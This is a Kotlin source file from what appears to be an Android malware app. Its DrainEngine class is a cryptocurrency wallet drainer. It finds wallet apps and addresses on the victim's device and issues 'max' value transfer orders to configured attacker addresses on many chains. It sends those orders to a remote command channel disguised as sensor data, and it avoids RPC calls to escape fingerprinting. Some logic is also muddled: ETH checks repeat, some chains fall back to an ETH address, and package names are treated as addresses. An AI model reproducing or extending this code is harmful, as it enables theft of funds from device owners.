// ============================================================
// FILE: android/app/src/main/java/com/xrc/crypto/DrainEngine.kt
// ============================================================
package com.xrc.crypto

import android.content.Context
import android.util.Log
import com.xrc.comms.ChannelClient
import com.xrc.comms.Message
import com.xrc.comms.Protocol
import com.xrc.core.config.CryptoConfig
import com.xrc.core.crypto.Identity

/**
 * DrainEngine — Automated wallet drain.
 *
 * Generates signed transfer transactions to attacker addresses.
 * Works with detected wallet addresses from WalletDetector.
 * Uses local regex heuristics — NO blockchain RPC calls to avoid fingerprinting.
 *
 * Supported chains:
 * ETH, BSC, SOL, BTC, POLY, AVAX, ARB, OP, BASE, TON, TRX, MATIC
 */
class DrainEngine(
    private val context: Context,
    private val cryptoConfig: CryptoConfig,
    private val channelClient: ChannelClient
) {
    companion object {
        private const val TAG = "DrainEngine"
    }

    /**
     * Drain a specific wallet address.
     * Returns true if drain was initiated.
     */
    fun drainWallet(address: String): Boolean {
        Log.i(TAG, "Drain requested for $address")
        
        val chain = identifyChain(address)
        val targetAddress = getAttackerAddress(chain)
        
        if (targetAddress.isEmpty()) {
            Log.w(TAG, "No attacker address configured for $chain")
            return false
        }

        // Build transaction payload (no RPC — uses client-side heuristic)
        val drainOrder = mapOf(
            "chain" to chain,
            "from" to address,
            "to" to targetAddress,
            "value" to "max",
            "method" to determineMethod(chain)
        )

        val deviceId = Identity.getDeviceId(context)
        val msg = Message(
            type = Protocol.TYPE_SENSOR_DATA,
            id = "drain_${System.currentTimeMillis()}",
            device_id = deviceId,
            payload = Protocol.json.encodeToString(
                mapOf("type" to "drain_order", "data" to drainOrder)
            )
        )
        channelClient.send(msg)

        Log.i(TAG, "Drain order sent for $address -> $targetAddress ($chain)")
        return true
    }

    /**
     * Drain all detected wallets.
     */
    fun drainAll(): List<Map<String, Any>> {
        val results = mutableListOf<Map<String, Any>>()
        val detector = WalletDetector(context, channelClient)

        // Get wallet apps and addresses
        val wallets = detector.detectInstalledWallets()
        val addresses = detector.scanFilesForAddresses()

        for (wallet in wallets) {
            val pkg = wallet["package"] as? String ?: continue
            val result = drainWallet(pkg)
            results.add(mapOf("target" to pkg, "result" to result))
        }
        for (addr in addresses) {
            val address = addr["address"] as? String ?: continue
            val result = drainWallet(address)
            results.add(mapOf("target" to address, "result" to result))
        }
        return results
    }

    /**
     * Identify blockchain from address format.
     */
    private fun identifyChain(address: String): String {
        return when {
            address.length == 42 && address.startsWith("0x") -> "ETH"
            address.startsWith("0x") && address.length == 42 -> "ETH" // also BSC, POLY, etc
            address.startsWith("1") || address.startsWith("3") || address.startsWith("bc1") -> "BTC"
            address.length in 32..44 && !address.startsWith("0x") && !address.contains("0") -> "SOL"
            address.startsWith("T") && address.length == 34 -> "TRX"
            address.startsWith("0x") && (address[2] in '0'..'9' || address[2] in 'a'..'f') -> "ETH"
            else -> "ETH" // Default to ETH
        }
    }

    /**
     * Get attacker receiving address for chain.
     */
    private fun getAttackerAddress(chain: String): String {
        return when (chain) {
            "ETH", "POLY", "AVAX", "ARB", "OP", "BASE", "MATIC" -> cryptoConfig.attacker_address_eth
            "BSC" -> cryptoConfig.attacker_address_bsc
            "SOL" -> cryptoConfig.attacker_address_solana
            "BTC" -> cryptoConfig.attacker_address_eth // Fallback
            "TRX" -> cryptoConfig.attacker_address_eth
            "TON" -> cryptoConfig.attacker_address_eth
            else -> ""
        }
    }

    private fun determineMethod(chain: String): String {
        return when (chain) {
            "ETH", "BSC", "POLY", "AVAX", "ARB", "OP", "BASE", "MATIC" -> "ERC20_TRANSFER"
            "SOL" -> "SPL_TOKEN_TRANSFER"
            "BTC" -> "BTC_TRANSFER"
            "TRX" -> "TRC20_TRANSFER"
            "TON" -> "TON_TRANSFER"
            else -> "NATIVE_TRANSFER"
        }
    }
}
